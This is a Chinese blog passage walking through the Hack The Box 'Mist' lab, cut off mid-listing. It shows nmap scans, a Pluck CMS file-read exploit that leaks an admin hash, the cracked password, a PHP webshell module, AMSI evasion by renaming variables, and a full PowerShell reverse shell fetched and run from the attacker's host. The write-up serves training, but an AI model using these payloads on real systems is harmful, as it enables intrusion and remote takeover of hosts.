---
title: ESC13 组映射与多阶段域权限
url: https://lucifer11.xyz/knowledge/adcs-advanced/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:41.137328
---

# ESC13 组映射与多阶段域权限

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [多次账户转换与 ESC13 组映射](#%E5%A4%9A%E6%AC%A1%E8%B4%A6%E6%88%B7%E8%BD%AC%E6%8D%A2%E4%B8%8E-ESC13-%E7%BB%84%E6%98%A0%E5%B0%84)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# ESC13 组映射与多阶段域权限

发表于
2026-11-25

分类于

[身份与域安全](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/)
，
[证书服务](/categories/%E8%BA%AB%E4%BB%BD%E4%B8%8E%E5%9F%9F%E5%AE%89%E5%85%A8/%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1/)

阅读次数：

本文字数：
9.6k

阅读时长 ≈
35 分钟

Mist 的长链涉及多个主机、服务账户和证书策略。本章沿原实验的身份切换顺序保留全部材料，着重核对 OID 组映射、gMSA 读取和证书模板之间的实际权限关系。

Mist 的长链涉及多个主机、服务账户和证书策略。本章沿原实验的身份切换顺序保留全部材料，着重核对 OID 组映射、gMSA 读取和证书模板之间的实际权限关系。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/adcs-advanced/source.md)
展开全部技术记录

## 分析重点

Web 入口、认证 Relay 和 Shadow Credentials 分别对应不同执行身份。

ESC13 两次转换的模板、策略和目标组需要逐次核对。

原记录中的清理回滚、隧道、凭据容器和 DCSync 结果都随链保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [多次账户转换与 ESC13 组映射](#case-mist) | mist | ADCS、ESC13、gMSA、Shadow Credentials |

## 多次账户转换与 ESC13 组映射

原长链从 Pluck、认证请求和 Shadow Credentials 到 gMSA，再两次使用证书策略组映射。每个中间身份、权限回滚、证书与会话证据按原顺序保留。

来源 mist · 原记录 2024-10-27 · 72 个代码块 · 11 处图片引用

查看分析过程、攻击步骤与完整代码

#### 简述

本文是Insane难度的HTB Mist机器的域渗透部分，其中CVE-2024-9405 + PetitPotam Attack + shadow credential + s4u impersonat + reading GMSA password + abusing AddKeyCredentialLink + exploiting ADCS ESC 13 twice等域渗透提权细节是此box的特色，主要参考0xdf’s blog Mist walkthrough记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist.png)

#### 信息收集

#### nmap

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ``` | ``` fdluci@hacky$ nmap -p- --min-rate 10000 10.10.11.17 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:46 EDT Nmap scan report for 10.10.11.17 Host is up (0.089s latency). Not shown: 65534 filtered tcp ports (no-response) PORT   STATE SERVICE 80/tcp open  http  Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds fdluci@hacky$ nmap -sCV -p 80 10.10.11.17 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 15:50 EDT Nmap scan report for 10.10.11.17 Host is up (0.086s latency).  PORT   STATE SERVICE VERSION 80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |_http-generator: pluck 4.7.18 | http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set | http-robots.txt: 2 disallowed entries |_/data/ /docs/ |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 | http-title: Mist - Mist |_Requested resource was http://10.10.11.17/?file=mist  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds ``` |

#### Website - TCP 80

发现站点使用了Pluck CMS4.7.18版本

#### Shell as svc\_web on MS01

#### 恢复admin密码

#### 漏洞背景

一些研究发现CVE-2024-9405，一个在这个版本的Pluck中文件读取的漏洞。这篇来自m3n0sd0n4ld的博客文章Pluck CMS v.4.7.18 - Local File Inclusion unauthenticated (CVE-2024-9405)展示了细节。/data/modules/albums/albums\_getimage.php?image=[filename]路径在返回原始文件之前不检查身份验证。在Mist发布的时候，这篇文章还不存在，尽管在Pluck GitHub上有这个issueInclusion of files without authentication #122。

#### 目录发现 - 文件读取

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` ┌[root☮kali]-(~/hackthebox/machine/mist) └> curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=mist.php <?php $album_name = 'Mist'; ?>30#                                                                                                                                                                     ┌[root☮kali]-(~/hackthebox/machine/mist) └> curl http://10.10.11.17/data/modules/albums/albums_getimage.php\?image\=admin_backup.php <?php $ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e'; ?>146 ``` |

第一个看起来像是CMS的元数据。后者看起来像一个hash。$ww是用于在PluckCMS中保存管理hash的变量。

#### Crackstation

CrackStation将其识别为SHA512并立即将其破解：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` lexypoo97 ``` |

然后在/login.php使用账号密码登录

#### Webshell Pluck Module

#### Create Module

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` fdluci@hacky$ cat modluci/luci.php <?php system($_REQUEST['cmd']); ?> ``` |

然后使用zip打包

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` ┌[root☮kali]-(~/hackthebox/machine/mist) └> zip -r notevil.zip modluci   adding: modluci/ (stored 0%)   adding: modluci/luci.php (stored 0%) ``` |

#### Upload Module

在Pluck管理面板的”选项”下有一个”管理模块”选项：

点击”Install a module…”，然后选择notevil.zip

现在/data/modules目录下有notevil

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` http://10.10.11.17/data/modules/  http://10.10.11.17/data/modules/notevil/modluci/luci.php?cmd=whoami ms01\svc_web ``` |

#### Bypass AMSI

AMSI是一项内置在Windows中的技术，旨在保护Windows免受恶意PowerShell（和其他攻击）的攻击。很可能是它挡住了我的PowerShell revshell。

幸运的是，它是基于签名的。绕过它的一个技巧（至少在撰写本文时）是从revshells.com获取PowerShell #2并更改所有变量名称。

* rev.ps1

|  |  |
| --- | --- |
| ``` 1 ``` | ``` $c = New-Object Net.Sockets.TCPClient('10.10.14.22',444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$ssb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ssb,0,$ssb.Length);$s.Flush()};$c.Close() ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` python -m http.server 8081  POST /data/modules/notevil/modluci/luci.php HTTP/1.1 Host: 10.10.11.17 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: PHPSESSID=oesq5ctuijids3s6qndvpimgrc Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Content-Type: application/x-www-form-urlencoded Content-Length: 92   cmd=powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.22/rev.ps1') ``` |

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` ~/hackthebox/machine/mist❯❯❯ rlwrap -cAr nc -lvnp 444 listening on [any] 444 ... connect to [10.10.14.22] from (UNKNOWN) [10.10.11.17] 56245  PS C:\xampp\htdocs\data\modules\notevil\modluci> whoami ms01\svc_web ``` |

#### Shell as Brandon.Keywarp on MS01

#### Enumeration

#### Host

该主机不是主要主机，而是运行在Mist上的虚拟机。IP地址为192.168.100.101，主机名为MS01。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` PS C:\xampp\htdocs\data\modules\notevil\modluci> ipconfig  Windows IP Configuration   Ethernet adapter Ethernet:     Connection-specific DNS Suffix  . :    IPv4 Address. . . . . . . . . . . : 192.168.100.101    Subnet Mask . . . . . . . . . . . : 255.255.255.0    Default Gateway . . . . . . . . . : 192.168.100.100 PS C:\> hostname MS01 ``` |

以下目录可写

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` PS C:\Common Applications> ls      Directory: C:\Common Applications  Mode                 LastWriteTime         Length Name ----                 -------------         ------ ---- -a----        10/21/2024   2:41 PM             14 luci.lnk -a----          5/8/2021   1:15 AM           1118 Calculator.lnk -a----          5/7/2021   3:14 PM           1175 Notepad.lnk -a----          5/7/2021   3:15 P...